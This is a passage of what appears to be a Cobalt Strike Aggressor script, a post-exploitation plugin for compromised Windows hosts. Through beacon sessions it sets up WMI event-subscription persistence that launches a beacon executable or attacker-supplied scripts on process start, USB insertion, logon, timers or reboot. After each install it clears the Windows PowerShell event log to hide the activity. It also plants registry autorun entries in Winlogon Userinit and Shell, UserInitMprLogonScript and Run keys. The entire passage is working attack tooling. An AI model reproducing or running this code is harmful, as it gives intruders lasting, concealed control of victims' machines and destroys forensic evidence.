								bshell($bid,"wevtutil cl \"Windows PowerShell\"");
							}
						
						}else if($Trigger eq "InsertUSB"){
							if($CommandLineTemplate eq ""){
								$Dialog = dialog("Command行Settings ",%(EventFilterName => $EventFilterName,EventConsumerName => $EventConsumerName,CommandLineTemplate => "C:\\beacon.exe",Trigger => $Trigger, RunType => $RunType , bid => $bid),&RegWMI);
								dialog_description($Dialog, "Settings Events will match the process, and when the process starts it will Trigger Events consumer Command line Execution.");
								drow_text($Dialog, "EventFilterName",  "Events Filter Name:");
								drow_text($Dialog, "EventConsumerName",  "Events Consumer Name:");
								drow_text($Dialog, "CommandLineTemplate",  "CommandLine:");
								dbutton_action($Dialog, "RegWMI");
								dialog_show($Dialog);
							}else{
								blog($bid, "WMI InsertUSB Event Install");
								bpowershell_import($bid, script_resource("scripts/AuthMaintainWmi/Wmi_Persistence.ps1"));
								bpowerpick($bid,"RegEventSubscription -Trigger $Trigger -RunType $RunType -EventFilterName $EventFilterName -EventConsumerName $EventConsumerName -CommandLineTemplate $CommandLineTemplate");
								bshell($bid,"wevtutil cl \"Windows PowerShell\"");
							}
						}else if($Trigger eq "UserLogon"){
							if($UserName eq ""){
								$Dialog = dialog("Settings User ",%(EventFilterName => $EventFilterName,EventConsumerName => $EventConsumerName,CommandLineTemplate => "C:\\beacon.exe",Trigger => $Trigger, Domain => "" , UserName => "*",RunType => $RunType , bid => $bid ),&RegWMI);
								dialog_description($Dialog, "Trigger CommandExecution when User of Settings logs in.");
								drow_text($Dialog, "EventFilterName",  "Events Filter Name:");
								drow_text($Dialog, "EventConsumerName",  "Events Consumer Name:");
								drow_text($Dialog, "CommandLineTemplate",  "CommandLine:");
								drow_text($Dialog, "Domain",  "Domain Name:");
								drow_text($Dialog, "UserName",  "User Name:");
								dbutton_action($Dialog, "RegWMI");
								dialog_show($Dialog);
							}else{
								blog($bid, "WMI $Trigger Event Install");
								bpowershell_import($bid, script_resource("scripts/AuthMaintainWmi/Wmi_Persistence.ps1"));
								bpowerpick($bid,"RegEventSubscription -Trigger $Trigger -RunType $RunType -EventFilterName $EventFilterName -EventConsumerName $EventConsumerName -CommandLineTemplate $CommandLineTemplate -UserName $UserName -Domain $Domain");
								bshell($bid,"wevtutil cl \"Windows PowerShell\"");
							}                                                                                                                               
						}else if($Trigger eq "Interval"){
							if($IntervalPeriod eq ""){
								$Dialog = dialog("Settings Events Notification interval",%(EventFilterName => $EventFilterName,EventConsumerName => $EventConsumerName,CommandLineTemplate => "C:\\beacon.exe",Trigger => $Trigger, IntervalPeriod => "3600" ,TimerId => "WindowsTimer_".ticks(),RunType => $RunType , bid => $bid ),&RegWMI);
								dialog_description($Dialog, "Generate Events notifications every certain time, default 60 minutes.");
								drow_text($Dialog, "EventFilterName",  "Events Filter Name:");
								drow_text($Dialog, "EventConsumerName",  "Events Consumer Name:");
								drow_text($Dialog, "CommandLineTemplate",  "CommandLine:");
								drow_text($Dialog, "IntervalPeriod",  "Interval Period (in seconds):");
								drow_text($Dialog, "TimerId",  "Timer Id name:");
								dbutton_action($Dialog, "RegWMI");
								dialog_show($Dialog);
							}else{
								blog($bid, "WMI $Trigger Event Install");
								bpowershell_import($bid, script_resource("scripts/AuthMaintainWmi/Wmi_Persistence.ps1"));
								bpowerpick($bid,"RegEventSubscription -Trigger $Trigger -RunType $RunType -EventFilterName $EventFilterName -EventConsumerName $EventConsumerName -CommandLineTemplate $CommandLineTemplate -IntervalPeriod $IntervalPeriod -TimerId $TimerId");
								bshell($bid,"wevtutil cl \"Windows PowerShell\"");
							}
						}else if($Trigger eq "Timed"){
							if($ExecutionTime eq ""){
								$Dialog = dialog("Specify a time to launch Events notifications",%(EventFilterName => $EventFilterName,EventConsumerName => $EventConsumerName,CommandLineTemplate => "C:\\beacon.exe",Trigger => $Trigger, ExecutionTime => formatDate((ticks()+(1000 * 40 * 1)),"MM/dd/yyyy HH:mm:ss") , TimerId => "WindowsTimer_".ticks(),RunType => $RunType , bid => $bid ),&RegWMI);
								dialog_description($Dialog, "Settings A time to initiate Events notifications, such as 'MM/dd/yyyy HH:mm:ss'");
								drow_text($Dialog, "EventFilterName",  "Events Filter Name:");
								drow_text($Dialog, "EventConsumerName",  "Events Consumer Name:");
								drow_text($Dialog, "CommandLineTemplate",  "CommandLine:");
								drow_text($Dialog, "ExecutionTime",  "Execution Time:");
								drow_text($Dialog, "TimerId",  "Timer ID name:");
								dbutton_action($Dialog, "RegWMI");
								dialog_show($Dialog);
							}else{
								blog($bid, "WMI $Trigger Event Install");
								bpowershell_import($bid, script_resource("scripts/AuthMaintainWmi/Wmi_Persistence.ps1"));
								bpowerpick($bid,"RegEventSubscription -RunType $RunType -Trigger $Trigger -EventFilterName $EventFilterName -EventConsumerName $EventConsumerName -CommandLineTemplate $CommandLineTemplate -TimerId $TimerId -ExecutionTime \"".$ExecutionTime."\"");
								bshell($bid,"wevtutil cl \"Windows PowerShell\"");
							}
						}else if($Trigger eq "Reboot"){
								if($CommandLineTemplate eq ""){
									$Dialog = dialog("Set CommandLine",%(EventFilterName => $EventFilterName,EventConsumerName => $EventConsumerName,CommandLineTemplate => "C:\\beacon.exe",Trigger => $Trigger,RunType => $RunType , bid => $bid ),&RegWMI);
									dialog_description($Dialog, "Set CommandLine");
									drow_text($Dialog, "EventFilterName",  "Events Filter Name:");
									drow_text($Dialog, "EventConsumerName",  "Events Consumer Name:");
									drow_text($Dialog, "CommandLineTemplate",  "CommandLine:");
									dbutton_action($Dialog, "RegWMI");
									dialog_show($Dialog);
								}else{
									blog($bid, "[*] WMI $Trigger Event Install");
									bpowershell_import($bid, script_resource("scripts/AuthMaintainWmi/Wmi_Persistence.ps1"));
									bpowerpick($bid,"RegEventSubscription -RunType $RunType -Trigger $Trigger -EventFilterName $EventFilterName -EventConsumerName $EventConsumerName -CommandLineTemplate $CommandLineTemplate");
									bshell($bid,"wevtutil cl \"Windows PowerShell\"");
								}				
						}else{
							
							
						}
					}else if($RunType  eq "ActiveScript"){
						if($Trigger eq "ProcessStart"){
							if($ProcessName eq ""){
								$Dialog = dialog("Process Name says Settings ",%(EventFilterName => $EventFilterName,EventConsumerName => $EventConsumerName,CommandLineTemplate => "C:\\beacon.exe",Trigger => $Trigger, ProcessName => "LogonUI.exe" ,RunType => $RunType , ScriptingEngine => 'VBScript', PermanentScript => $Tmp , bid => $bid),&RegWMI);
								dialog_description($Dialog, "Settings Events will match the process, and when the process starts it will Trigger Events consumer Command line Execution.s");
								drow_text($Dialog, "EventFilterName",  "Events Filter Name:");
								drow_text($Dialog, "EventConsumerName",  "Events Consumer Name:");
								drow_text($Dialog, "ProcessName",  "Process Name:");
								drow_combobox($Dialog, "ScriptingEngine", "Script engine: ", @("VBScript","JScript"));
								drow_text_big($Dialog, "PermanentScript",  "Script content:");
								dbutton_action($Dialog, "RegWMI");
								dialog_show($Dialog);
							}else{
								blog($bid, "WMI ProcessStart Event Install");
								bpowershell_import($bid, script_resource("scripts/AuthMaintainWmi/Wmi_Persistence.ps1"));
								bpowerpick($bid,"RegEventSubscription -Trigger $Trigger -RunType $RunType -EventFilterName $EventFilterName -EventConsumerName $EventConsumerName -CommandLineTemplate $CommandLineTemplate -ProcessName $ProcessName");
								bshell($bid,"wevtutil cl \"Windows PowerShell\"");
							}
						
						}else if($Trigger eq "InsertUSB"){
							if($PermanentScript eq ""){
								$Dialog = dialog($Trigger,%(EventFilterName => $EventFilterName,EventConsumerName => $EventConsumerName,CommandLineTemplate => "C:\\beacon.exe",Trigger => $Trigger, Domain => "" , UserName => "*",RunType => $RunType ,ScriptingEngine => 'VBScript', PermanentScript => $Tmp , bid => $bid ),&RegWMI);
								dialog_description($Dialog, "for Events ".$Trigger." Settings Execution内容");
								drow_text($Dialog, "EventFilterName",  "Events Filter Name:");
								drow_text($Dialog, "EventConsumerName",  "Events Consumer Name:");
								drow_text_big($Dialog, "PermanentScript",  "Script content:");
								drow_combobox($Dialog, "ScriptingEngine", "Script engine: ", @("VBScript","JScript"));
								dbutton_action($Dialog, "RegWMI");
								dialog_show($Dialog);
							}
							else{
								blog($bid, "WMI InsertUSB Event Install");
								bpowershell_import($bid, script_resource("scripts/AuthMaintainWmi/Wmi_Persistence.ps1"));
								bpowerpick($bid,"RegEventSubscription -Trigger $Trigger -RunType $RunType -EventFilterName $EventFilterName -EventConsumerName $EventConsumerName -CommandLineTemplate $CommandLineTemplate");
								bshell($bid,"wevtutil cl \"Windows PowerShell\"");
							}
						}else if($Trigger eq "UserLogon"){
							if($UserName eq "")
							{
								$Dialog = dialog("Settings User ",%(EventFilterName => $EventFilterName,EventConsumerName => $EventConsumerName,CommandLineTemplate => "C:\\beacon.exe",Trigger => $Trigger, Domain => "" , UserName => "*",RunType => $RunType ,ScriptingEngine => 'VBScript', PermanentScript => $Tmp , bid => $bid ),&RegWMI);
								dialog_description($Dialog, "Trigger CommandExecution when User of Settings logs in.");
								drow_text($Dialog, "Domain",  "Domain Name:");
								drow_text($Dialog, "UserName",  "User Name:");
								drow_text_big($Dialog, "PermanentScript",  "Script content:");
								drow_text($Dialog, "EventFilterName",  "Events Filter Name:");
								drow_text($Dialog, "EventConsumerName",  "Events Consumer Name:");
								drow_combobox($Dialog, "ScriptingEngine", "Script engine: ", @("VBScript","JScript"));
								dbutton_action($Dialog, "RegWMI");
								dialog_show($Dialog);
							}else{
								blog($bid, "WMI UserLogon Event Install");
								bpowershell_import($bid, script_resource("scripts/AuthMaintainWmi/Wmi_Persistence.ps1"));
								bpowerpick($bid,"RegEventSubscription -Trigger $Trigger -RunType $RunType -EventFilterName $EventFilterName -EventConsumerName $EventConsumerName -CommandLineTemplate $CommandLineTemplate -UserName $UserName -Domain $Domain");
								bshell($bid,"wevtutil cl \"Windows PowerShell\"");
							}                                                                                                                               
						}else if($Trigger eq "Interval"){
							if($IntervalPeriod eq ""){
								$Dialog = dialog("Settings Events Notification Time interval",%(EventFilterName => $EventFilterName,EventConsumerName => $EventConsumerName,Trigger => $Trigger, IntervalPeriod => "3600" , TimerId => "WindowsTimer_".ticks() ,RunType => $RunType ,ScriptingEngine => 'VBScript', PermanentScript => $Tmp , bid => $bid ),&RegWMI);
								dialog_description($Dialog, "Generate Events notifications every certain time, default 60 minutes.");
								drow_text_big($Dialog, "PermanentScript",  "Script content:");
								drow_text($Dialog, "TimerId",  "Timer Name or ID:");
								drow_text($Dialog, "EventFilterName",  "Events Filter Name:");
								drow_text($Dialog, "EventConsumerName",  "Events Consumer Name:");
								drow_combobox($Dialog, "ScriptingEngine", "Script engine: ", @("VBScript","JScript"));
								drow_text($Dialog, "IntervalPeriod",  "IntervalEvents (in seconds):");
								dbutton_action($Dialog, "RegWMI");
								dialog_show($Dialog);
							}else{
								blog($bid, "WMI Interval Event Install");
								bpowershell_import($bid, script_resource("scripts/AuthMaintainWmi/Wmi_Persistence.ps1"));
								bpowerpick($bid,"RegEventSubscription -Trigger $Trigger -RunType $RunType -EventFilterName $EventFilterName -EventConsumerName $EventConsumerName -ScriptingEngine $ScriptingEngine -PermanentScript '".$Tmp."' -IntervalPeriod $IntervalPeriod -TimerId $TimerId");
								bshell($bid,"wevtutil cl \"Windows PowerShell\"");
							}
						}else if($Trigger eq "Timed"){
							if($ExecutionTime eq ""){
								$Dialog = dialog("Specify a Time to initiate Events notifications",%(EventFilterName => $EventFilterName,EventConsumerName => $EventConsumerName,Trigger => $Trigger, ExecutionTime => formatDate((ticks()+(1000 * 40 * 1)),"MM/dd/yyyy HH:mm:ss") , TimerId => "WindowsTimer_".ticks(), RunType => $RunType , ScriptingEngine => 'VBScript', PermanentScript => $Tmp  ,bid => $bid ),&RegWMI);
								dialog_description($Dialog, "Settings A Time initiates an Events notification, such as 'MM/dd/yyyy HH:mm:ss'");
								drow_text_big($Dialog, "PermanentScript",  "Script content:");
								drow_text($Dialog, "ExecutionTime",  "ExecutionTime:");
								drow_text($Dialog, "TimerId",  "Timer Name or ID:");
								drow_text($Dialog, "EventFilterName",  "Events Filter Name:");
								drow_text($Dialog, "EventConsumerName",  "Events Consumer Name:");
								drow_combobox($Dialog, "ScriptingEngine", "Script engine: ", @("VBScript","JScript"));
								dbutton_action($Dialog, "RegWMI");
								dialog_show($Dialog);
							}else{
								blog($bid, "WMI $Trigger Event Install");
								bpowershell_import($bid, script_resource("scripts/AuthMaintainWmi/Wmi_Persistence.ps1"));
								bpowerpick($bid,"RegEventSubscription -Trigger $Trigger -RunType $RunType -EventFilterName $EventFilterName -EventConsumerName $EventConsumerName -ScriptingEngine $ScriptingEngine -PermanentScript '".$Tmp."'  -TimerId $TimerId -ExecutionTime \"".$ExecutionTime."\"");
								bshell($bid,"wevtutil cl \"Windows PowerShell\"");
							}
						}else if($Trigger eq "Reboot"){
								blog($bid, "WMI $Trigger Event Install");
								bpowershell_import($bid, script_resource("scripts/AuthMaintainWmi/Wmi_Persistence.ps1"));
								bpowerpick($bid,"RegEventSubscription -Trigger $Trigger -RunType $RunType -EventFilterName $EventFilterName -EventConsumerName $EventConsumerName -CommandLineTemplate $CommandLineTemplate");
								bshell($bid,"wevtutil cl \"Windows PowerShell\"");
							
						}else{
							
							
						}

					}else if($RunType  eq "LocalScriptBlock"){
						blog($bid, "[*] LocalScriptBlock");
						if($Trigger eq "ProcessStart"){
							if($ProcessName eq "")
							{
								$Dialog = dialog("Process Name PID? Settings",%(EventFilterName => $EventFilterName,EventConsumerName => $EventConsumerName,CommandLineTemplate => "C:\\beacon.exe",Trigger => $Trigger, ProcessName => "LogonUI.exe" ,RunType => $RunType , ScriptingEngine => 'VBScript', PermanentScript => $Tmp , bid => $bid),&RegWMI);
								dialog_description($Dialog, "Settings Events will match the process, and when the process starts it will Trigger Events consumer Command line Execution.");
								drow_text($Dialog, "EventFilterName",  "Events Filter Name:");
								drow_text($Dialog, "EventConsumerName",  "Events Consumer Name:");
								drow_text($Dialog, "ProcessName",  "Process Name:");
								drow_combobox($Dialog, "ScriptingEngine", "Script engine: ", @("VBScript","JScript"));
								drow_text_big($Dialog, "PermanentScript",  "Script content:");
								dbutton_action($Dialog, "RegWMI");
								dialog_show($Dialog);
							}else{
								blog($bid, "[*] WMI ProcessStart Event Install");
								bpowershell_import($bid, script_resource("scripts/AuthMaintainWmi/Wmi_Persistence.ps1"));
								bpowerpick($bid,"RegEventSubscription -Trigger $Trigger -RunType $RunType -EventFilterName $EventFilterName -LocalScriptBlock {Start-Process C:\\beacon.exe} -ProcessName $ProcessName");
								bshell($bid,"wevtutil cl \"Windows PowerShell\"");
							}
						
						}else if($Trigger eq "InsertUSB")
						{
							if($PermanentScript eq ""){
								$Dialog = dialog($Trigger,%(EventFilterName => $EventFilterName,EventConsumerName => $EventConsumerName,CommandLineTemplate => "C:\\beacon.exe",Trigger => $Trigger, Domain => "" , UserName => "*",RunType => $RunType ,ScriptingEngine => 'VBScript', PermanentScript => $Tmp , bid => $bid ),&RegWMI);
								dialog_description($Dialog, "for Events ".$Trigger." Settings Execution Content");
								drow_text($Dialog, "EventFilterName",  "Events Filter Name:");
								drow_text($Dialog, "EventConsumerName",  "Events Consumer Name:");
								drow_text_big($Dialog, "PermanentScript",  "Script content:");
								drow_combobox($Dialog, "ScriptingEngine", "Script engine: ", @("VBScript","JScript"));
								dbutton_action($Dialog, "RegWMI");
								dialog_show($Dialog);
							}
							else{
								blog($bid, "[*] WMI InsertUSB Event Install");
								bpowershell_import($bid, script_resource("scripts/AuthMaintainWmi/Wmi_Persistence.ps1"));
								bpowerpick($bid,"RegEventSubscription -Trigger $Trigger -RunType $RunType -EventFilterName $EventFilterName -EventConsumerName $EventConsumerName -CommandLineTemplate $CommandLineTemplate");
								bshell($bid,"wevtutil cl \"Windows PowerShell\"");
							}

							
						}else if($Trigger eq "UserLogon"){
							
							if($UserName eq "")
							{
								$Dialog = dialog("Settings User ",%(EventFilterName => $EventFilterName,EventConsumerName => $EventConsumerName,CommandLineTemplate => "C:\\beacon.exe",Trigger => $Trigger, Domain => "" , UserName => "*",RunType => $RunType ,ScriptingEngine => 'VBScript', PermanentScript => $Tmp , bid => $bid ),&RegWMI);
								dialog_description($Dialog, "Trigger CommandExecution when User of Settings logs in.");
								drow_text($Dialog, "Domain",  "Domain Name:");
								drow_text($Dialog, "UserName",  "User Name:");
								drow_text_big($Dialog, "PermanentScript",  "Script content:");
								drow_text($Dialog, "EventFilterName",  "Events Filter Name:");
								drow_text($Dialog, "EventConsumerName",  "Events Consumer Name:");
								drow_combobox($Dialog, "ScriptingEngine", "Script engine: ", @("VBScript","JScript"));
								dbutton_action($Dialog, "RegWMI");
								dialog_show($Dialog);
							}else{
								blog($bid, "[*] WMI UserLogon Event Install");
								bpowershell_import($bid, script_resource("scripts/AuthMaintainWmi/Wmi_Persistence.ps1"));
								bpowerpick($bid,"RegEventSubscription -Trigger $Trigger -RunType $RunType -EventFilterName $EventFilterName -EventConsumerName $EventConsumerName -CommandLineTemplate $CommandLineTemplate -UserName $UserName -Domain $Domain");
								bshell($bid,"wevtutil cl \"Windows PowerShell\"");
							}                                                                                                                               
						
						}else if($Trigger eq "Interval"){
							if($IntervalPeriod eq "")
							{
								$Dialog = dialog("Settings Events Notification Time interval",%(EventFilterName => $EventFilterName,EventConsumerName => $EventConsumerName,Trigger => $Trigger, IntervalPeriod => "3600" , TimerId => "WindowsTimer",RunType => $RunType ,ScriptingEngine => 'VBScript', PermanentScript => $Tmp , bid => $bid ),&RegWMI);
								dialog_description($Dialog, "Generate Events notifications every certain time, default 60 minutes.s");
								drow_text_big($Dialog, "PermanentScript",  "Script content:");
								drow_text($Dialog, "TimerId",  "Timer Name or ID:");
								drow_text($Dialog, "EventFilterName",  "Events Filter Name:");
								drow_text($Dialog, "EventConsumerName",  "Events Consumer Name:");
								drow_combobox($Dialog, "ScriptingEngine", "Script engine: ", @("VBScript","JScript"));
								drow_text($Dialog, "IntervalPeriod",  "IntervalEvents (in seconds):");
								dbutton_action($Dialog, "RegWMI");
								dialog_show($Dialog);
							}else{
								blog($bid, "[*] WMI Interval Event Install");
								bpowershell_import($bid, script_resource("scripts/AuthMaintainWmi/Wmi_Persistence.ps1"));
								bpowerpick($bid,"RegEventSubscription -Trigger $Trigger -RunType $RunType -EventFilterName $EventFilterName -EventConsumerName $EventConsumerName -CommandLineTemplate $CommandLineTemplate -IntervalPeriod $IntervalPeriod -TimerId $TimerId");
								bshell($bid,"wevtutil cl \"Windows PowerShell\"");
							}
						}else if($Trigger eq "Timed"){
							if($ExecutionTime eq ""){
								$Dialog = dialog("Specify a Time to initiate Events notifications",%(EventFilterName => $EventFilterName,EventConsumerName => $EventConsumerName,CommandLineTemplate => "C:\\beacon.exe",Trigger => $Trigger, ExecutionTime => formatDate((ticks()+(1000 * 40 * 1)),"MM/dd/yyyy HH:mm:ss") , TimerId => "WindowsTimer_".ticks(), RunType => $RunType , ScriptingEngine => 'VBScript', PermanentScript => $Tmp  ,bid => $bid ),&RegWMI);
								dialog_description($Dialog, "Settings A Time initiates an Events notification, such as 'MM/dd/yyyy HH:mm:ss'");
								drow_text_big($Dialog, "PermanentScript",  "Script content:");
								drow_text($Dialog, "ExecutionTime",  "ExecutionTime:");
								drow_text($Dialog, "TimerId",  "Timer Name or ID:");
								drow_text($Dialog, "EventFilterName",  "Events Filter Name:");
								drow_text($Dialog, "EventConsumerName",  "Events Consumer Name:");
								drow_combobox($Dialog, "ScriptingEngine", "Script engine: ", @("VBScript","JScript"));
								dbutton_action($Dialog, "RegWMI");
								dialog_show($Dialog);
							}else{
								blog($bid, "[*] WMI $Trigger Event Install");
								bpowershell_import($bid, script_resource("scripts/AuthMaintainWmi/Wmi_Persistence.ps1"));
								bpowerpick($bid,"RegEventSubscription -Trigger $Trigger -RunType $RunType -EventFilterName $EventFilterName -LocalScriptBlock {Start-Process C:\\beacon.exe} -TimerId $TimerId -ExecutionTime \"".$ExecutionTime."\"");
								bshell($bid,"wevtutil cl \"Windows PowerShell\"");
							}
						}else if($Trigger eq "Reboot"){
								blog($bid, "[*] WMI $Trigger Event Install");
								bpowershell_import($bid, script_resource("scripts/AuthMaintainWmi/Wmi_Persistence.ps1"));
								bpowerpick($bid,"RegEventSubscription -Trigger $Trigger -RunType $RunType -EventFilterName $EventFilterName -EventConsumerName $EventConsumerName -CommandLineTemplate $CommandLineTemplate");
								bshell($bid,"wevtutil cl \"Windows PowerShell\"");
							
						}else{

							
						}
					}
				}	
			}else{
				blog($bid,"\c4 It't need Admin privilege.");
			}
		}


		sub getnow {
			return (formatDate("yyyy/MM/dd HH:mm:ss"));
		}


		sub AddRegAutoRun{
			local('$Prefix $File $Key $Item $Reg $bid $Arch $KeyName $user');
			$Prefix = "\\Software\\Microsoft\\Windows\\CurrentVersion\\";
			$File = replace($3['CallBackFile'], "\"", "");
			$Key = "\"".$3['RegKey'];
			$bid =  $3['bid'];
			$Item = $3['RegItem']."\"";
			$KeyName =  $3['KeyName'];
			$Arch =  $3['Arch'];
			$user = replace(beacon_info($bid, "user"), " \\*", "");
			blog($bid, "-------".getnow()."-------");
			if($3['RegItem'] eq "Winlogon Userinit"){
				#HKLM location, distinguish process bits, require administrator privileges, load Registration Form according to system bits.
				$Key = "\"HKLM";
				blog($bid, "Location:HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon, KeyName:Userinit");
				$Prefix = replace($Prefix,'Windows',"Windows NT");
				$Reg = $Key.$Prefix.replace($Item,"Winlogon Userinit","Winlogon");
				if($Arch eq "x86"){
					blog($bid, "reg add  $+ $Reg /v Userinit /t REG_SZ /d \"C:\\Windows\\system32\\userinit.exe, $+ $File\" /f /reg:32");
					brun($bid,"reg add  $+ $Reg /v Userinit /t REG_SZ /d \"C:\\Windows\\system32\\userinit.exe, $+ $File\" /f /reg:32");
				}
				else{
					blog($bid, "reg add  $+ $Reg /v Userinit /t REG_SZ /d \"C:\\Windows\\system32\\userinit.exe, $+ $File\" /f /reg:64");
					brun($bid,"reg add  $+ $Reg /v Userinit /t REG_SZ /d \"C:\\Windows\\system32\\userinit.exe, $+ $File\" /f /reg:64");
				}
			}else if($3['RegItem'] eq "Winlogon Shell"){  
				# Execution only when User logged in (may need to logout-login Trigger ),64-bit system Execution64-bit Registration Form Location; 32-bit system Execution32-bit Registration Form location;
				# Boot according to system bits
				# High priority
				# User permission Write to HKCU,Trigger succeeds. system permission Write to HKCU causes problems. Attention!
				if($user eq "SYSTEM"){
					blog($bid, "\c4 Your are $user ,There will be unexpected error.");
					return;
				}
				$Key = "\"HKCU";
				blog($bid, "Location:HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon, KeyName:Shell");
				$Prefix = replace($Prefix,'Windows',"Windows NT");
				$Reg = $Key.$Prefix.replace($Item,"Winlogon Shell","Winlogon");
				if($Arch eq "x86"){
					blog($bid, "reg add  $+ $Reg /v Shell /t REG_SZ /d \"explorer.exe, $+ $File\" /f /reg:32");
					brun($bid,"reg add  $+ $Reg /v Shell /t REG_SZ /d \"explorer.exe, $+ $File\" /f /reg:32");
				}else{
					blog($bid, "reg add  $+ $Reg /v Shell /t REG_SZ /d \"explorer.exe, $+ $File\" /f /reg:64");
					brun($bid,"reg add  $+ $Reg /v Shell /t REG_SZ /d \"explorer.exe, $+ $File\" /f /reg:64");
				}		
			}else if($3['RegItem'] eq "Logon Scripts"){
				# SYSTEM (32-bit) privileges for this Registration Form item Query, Write to Operation are redirected to 32-bit, adding /reg:64 is also invalid. ,
				# Query and Write to Operation for this Registration Form item under Administrator (32-bit) privileges are redirected to 64-bit, and adding /reg:32 does not work.
				# May require User to log out and log in again after Trigger. Restarting login does not stabilize Execution.
				# User Permissions Add 
				# Login Execution
				# Only Execution corresponds to the system bit Registration Form location, usually x64
				
				$Key = "\"HKCU";
				blog($bid, "Location:HKEY_CURRENT_USER\\Environment, KeyName:UserInitMprLogonScript");
				
				if($user eq "SYSTEM"){
					# For the HKCU table, do not use the SYSTEM permission.
					blog($bid, "\c4 Your are $user ,There will be unexpected error.");
					return;
				}
				if($Arch eq "x86"){
					blog($bid,"reg add \"HKCU\\Environment\" /v UserInitMprLogonScript /t REG_SZ /d \" $+ $File\" /f /reg:32");
					brun($bid,"reg add \"HKCU\\Environment\" /v UserInitMprLogonScript /t REG_SZ /d \" $+ $File\" /f /reg:32");
				}else{
					blog($bid,"reg add \"HKCU\\Environment\" /v UserInitMprLogonScript /t REG_SZ /d \" $+ $File\" /f /reg:64");
					brun($bid,"reg add \"HKCU\\Environment\" /v UserInitMprLogonScript /t REG_SZ /d \" $+ $File\" /f /reg:64");
				}
			}
			else{
				$Reg = $Key.$Prefix.$Item;
				if($KeyName eq ""){
					blog($bid,"\c4 KeyName Not Input.");
				}else{
					if($Arch eq "x86"){
						blog($bid,"reg add  $+ $Reg /v $KeyName /t REG_SZ /d \"\\\" $+ $File\"\\\" /f /reg:32");
						brun($bid,"reg add  $+ $Reg /v $KeyName /t REG_SZ /d \"\\\" $+ $File\"\\\" /f /reg:32");
					}else{
						blog($bid,"reg add  $+ $Reg /v $KeyName /t REG_SZ /d \"\\\" $+ $File\"\\\" /f /reg:64");
						brun($bid,"reg add  $+ $Reg /v $KeyName /t REG_SZ /d \"\\\" $+ $File\"\\\" /f /reg:64");
					}
				}
			}
		}

		#QueryRegistration Form
		sub QueryRegAutoRun{
			local('$Prefix $Key $Item $Reg $bid');
			$Prefix = "\\Software\\Microsoft\\Windows\\CurrentVersion\\";
			$Key =  $3['RegKey'];
			$bid =  $3['bid'];
			$arch = $3['Arch'];
			$Item = $3['RegItem'];
			blog($bid, "-------".getnow()."-------");
			if($Item eq "Winlogon Userinit"){
				$Prefix = replace($Prefix,'Windows',"Windows NT");
				$Reg = $Key.$Prefix.replace($Item,"Winlogon Userinit","Winlogon");
				if($arch eq "All"){
					breg_queryv($bid, $Reg, "Userinit", "x86");
					breg_queryv($bid, $Reg, "Userinit", "x64");
				}else{
					breg_queryv($bid, $Reg, "Userinit", $arch);
				}
			}else if($Item eq "Winlogon Shell"){
				$Prefix = replace($Prefix,'Windows',"Windows NT");
				$Reg = $Key.$Prefix.replace($Item,"Winlogon Shell","Winlogon");
				if($arch eq "All"){
					breg_queryv($bid, $Reg, "Shell", "x86");
					breg_queryv($bid, $Reg, "Shell", "x64");
				}else{
					breg_queryv($bid, $Reg, "Shell", $arch);
				}
			}
			else if($Item eq "Logon Scripts"){
				$Reg = "HKCU\\Environment\\";
				if($arch eq "All"){
					breg_queryv($bid, $Reg, "UserInitMprLogonScript", "x86");
					breg_queryv($bid, $Reg, "UserInitMprLogonScript", "x64");
				}else{
					breg_queryv($bid, $Reg, "UserInitMprLogonScript", $arch);
				}
			}
			else{
				$Reg = $Key.$Prefix.$Item;		
				if($arch eq "All"){
					breg_query($bid, $Reg, "x86");
					breg_query($bid, $Reg, "x64");
				}else{
					breg_query($bid, $Reg, $arch);
				}
			}
		}

		#Clear Registration Form
		sub RemoveRegAutoRun{
			local('$Prefix $File $Key $Item $Reg $bid $KeyName $arch');
			$Prefix = "\\Software\\Microsoft\\Windows\\CurrentVersion\\";
			$File = replace($3['CallBackFile'], "\"", "");
			$Key = "\"".$3['RegKey'];
			$bid =  $3['bid'];
			$KeyName =  $3['KeyName'];
			$arch = $3['Arch'];
			$Item = $3['RegItem']."\"";
			if($3['RegItem'] eq "Winlogon Userinit"){
				$Prefix = replace($Prefix,'Windows',"Windows NT");
				$Reg = $Key.$Prefix.replace($Item,"Winlogon Userinit","Winlogon");
				blog($bid, "-------".getnow()."-------");
				if($arch eq "x86"){
					blog($bid, "-------".getnow()."-------");
					blog($bid, "reg add  $+ $Reg /v Userinit /t REG_SZ /d \" C:\\Windows\\system32\\userinit.exe,\" /f /reg:32");
					bshell($bid,"reg add  $+ $Reg /v Userinit /t REG_SZ /d \" C:\\Windows\\system32\\userinit.exe,\" /f /reg:32");
				}else{
					blog($bid, "-------".getnow()."-------");
					blog($bid, "reg add  $+ $Reg /v Userinit /t REG_SZ /d \" C:\\Windows\\system32\\userinit.exe,\" /f /reg:64");
					bshell($bid,"reg add  $+ $Reg /v Userinit /t REG_SZ /d \" C:\\Windows\\system32\\userinit.exe,\" /f /reg:64");
				}
			}else if($3['RegItem'] eq "Winlogon Shell"){
				blog($bid, "Location:HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon, KeyName:Shell");
				$Prefix = replace($Prefix,'Windows',"Windows NT");
				$Key = "\"HKLM";
				$Reg = $Key.$Prefix.replace($Item,"Winlogon Shell","Winlogon");
				if($arch eq "x86"){
					blog($bid, "-------".getnow()."-------");
					blog($bid, "reg add  $+ $Reg /v Shell /t REG_SZ /d \" explorer.exe\" /f /reg:32");
					bshell($bid,"reg add  $+ $Reg /v Shell /t REG_SZ /d \" explorer.exe\" /f /reg:32");
				}else{
					blog($bid, "-------".getnow()."-------");
					blog($bid, "reg add  $+ $Reg /v Shell /t REG_SZ /d \" explorer.exe\" /f /reg:64");
					bshell($bid,"reg add  $+ $Reg /v Shell /t REG_SZ /d \" explorer.exe\" /f /reg:64");
				}
			}
			else if($3['RegItem'] eq "Logon Scripts"){
				blog($bid, "-------".getnow()."-------");
				if($arch eq "x86"){
					blog($bid,"reg add \"HKCU\\Environment\" /v UserInitMprLogonScript /t REG_SZ /d \"\" /f /reg:32");
					bshell($bid,"reg add \"HKCU\\Environment\" /v UserInitMprLogonScript /t REG_SZ /d \"\" /f /reg:32");
				}else{
					blog($bid,"reg add \"HKCU\\Environment\" /v UserInitMprLogonScript /t REG_SZ /d \"\" /f /reg:64");
					bshell($bid,"reg add \"HKCU\\Environment\" /v UserInitMprLogonScript /t REG_SZ /d \"\" /f /reg:64");
				}
			}
			else{
